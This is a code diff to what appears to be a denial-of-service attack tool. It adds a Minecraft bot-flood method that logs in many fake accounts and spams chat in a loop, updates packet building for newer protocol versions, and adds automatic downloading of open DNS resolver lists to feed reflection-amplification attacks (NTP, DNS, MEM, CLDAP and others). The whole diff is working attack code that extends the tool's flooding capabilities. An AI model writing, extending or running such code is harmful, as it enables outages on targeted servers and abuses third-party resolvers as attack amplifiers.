@@ -136,7 +136,7 @@ class Methods:
 
     LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
-                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
+                                "MCBOT", "MCBOT-NF", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
                                 "TS3", "MCPE", "ICMP", "OVH-UDP",
                                 }
 
@@ -397,9 +397,18 @@ class Minecraft:
                               Minecraft.varint(state))
 
     @staticmethod
-    def login(protocol: int, username: str) -> bytes:
+    def _pack_uuid(uid: UUID) -> bytes:
+        return data_pack('>qq', uid.int >> 64, uid.int & 0xFFFFFFFFFFFFFFFF)
+
+    @staticmethod
+    def login(protocol: int, username: str, uid: UUID = None) -> bytes:
         if isinstance(username, str):
             username = username.encode()
+        if protocol >= 759:
+            uid = uid or uuid4()
+            return Minecraft.data(Minecraft.varint(0x00),
+                                  Minecraft.data(username),
+                                  Minecraft._pack_uuid(uid))
         return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                                0x01 if protocol >= 385 else \
                                                0x00),
@@ -424,6 +433,14 @@ class Minecraft:
 
     @staticmethod
     def chat(protocol: int, message: str) -> bytes:
+        if protocol >= 759:
+            pid = 0x04 if protocol <= 763 else 0x05
+            return Minecraft.data(Minecraft.varint(pid),
+                                  Minecraft.data(message.encode()),
+                                  Minecraft.long(int(time() * 1000)),
+                                  Minecraft.long(0),
+                                  b'\x00',
+                                  b'\x00')
         return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                                0x03 if protocol >= 464 else \
                                                0x02 if protocol >= 389 else \
@@ -475,6 +492,7 @@ class Layer4(Thread):
             "CPS": self.CPS,
             "CONNECTION": self.CONNECTION,
             "MCBOT": self.MCBOT,
+            "MCBOT-NF": self.MCBOT_NF,
         }
 
     def run(self) -> None:
@@ -578,15 +596,34 @@ class Layer4(Thread):
         s = None
 
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+            bot_uuid = uuid4()
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         self.protocolid,
                                                         2,
                                                         ProxyTools.Random.rand_ipv4(),
-                                                        uuid4()))
+                                                        bot_uuid))
             username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
             password = b64encode(username.encode()).decode()[:8].title()
-            Tools.send(s, Minecraft.login(self.protocolid, username))
-            
+            Tools.send(s, Minecraft.login(self.protocolid, username, bot_uuid))
+
+            sleep(1.5)
+
+            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
+            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))
+
+            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
+                sleep(1.1)
+
+    def MCBOT_NF(self) -> None:
+        s = None
+
+        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+            bot_uuid = uuid4()
+            Tools.send(s, Minecraft.handshake(self._target, self.protocolid, 2))
+            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
+            password = b64encode(username.encode()).decode()[:8].title()
+            Tools.send(s, Minecraft.login(self.protocolid, username, bot_uuid))
+
             sleep(1.5)
 
             Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
@@ -1404,6 +1441,49 @@ class ProxyManager:
         return proxes
 
 
+class ResolverManager:
+
+    @staticmethod
+    def DownloadFromConfig(cf) -> Set[str]:
+        providrs = cf.get("resolver-providers", [])
+        if not providrs:
+            logger.warning("No resolver providers configured")
+            return set()
+        logger.info(
+            f"{bcolors.WARNING}Downloading Resolvers from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
+                providrs))
+        resolvers: Set[str] = set()
+        with ThreadPoolExecutor(len(providrs)) as executor:
+            future_to_download = {
+                executor.submit(ResolverManager.download, provider): provider
+                for provider in providrs
+            }
+            for future in as_completed(future_to_download):
+                for ip in future.result():
+                    resolvers.add(ip)
+        return resolvers
+
+    @staticmethod
+    def download(provider) -> Set[str]:
+        logger.debug(
+            f"{bcolors.WARNING}Resolvers from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
+            (provider["url"], provider["timeout"]))
+        ips: Set[str] = set()
+        with suppress(TimeoutError, exceptions.ConnectionError,
+                      exceptions.ReadTimeout):
+            data = get(provider["url"], timeout=provider["timeout"]).text
+            for line in data.splitlines():
+                ip = line.strip()
+                if ip and Tools.IP.fullmatch(ip):
+                    ips.add(ip)
+        return ips
+
+    @staticmethod
+    def saveToFile(resolvers: Set[str], filepath: Path):
+        with open(filepath, "w") as f:
+            f.write("\n".join(sorted(resolvers)))
+
+
 class ToolsConsole:
     METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
 
@@ -1800,7 +1880,12 @@ if __name__ == '__main__':
                         refl_li = Path(__dir__ / "files" / argfive)
                         if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                             if not refl_li.exists():
-                                exit("The reflector file doesn't exist")
+                                logger.info("Reflector file not found, auto-downloading resolvers...")
+                                resolvers = ResolverManager.DownloadFromConfig(con)
+                                if not resolvers:
+                                    exit("Failed to download resolvers")
+                                ResolverManager.saveToFile(resolvers, refl_li)
+                                logger.info(f"Saved {len(resolvers)} resolvers to {refl_li}")
                             if len(argv) == 7:
                                 logger.setLevel("DEBUG")
                             ref = set(a.strip()
@@ -1829,7 +1914,7 @@ if __name__ == '__main__':
                         protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                         protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                         
-                        if 47 < protocolid > 758:
+                        if 47 < protocolid > 770:
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
 
                 for _ in range(threads):
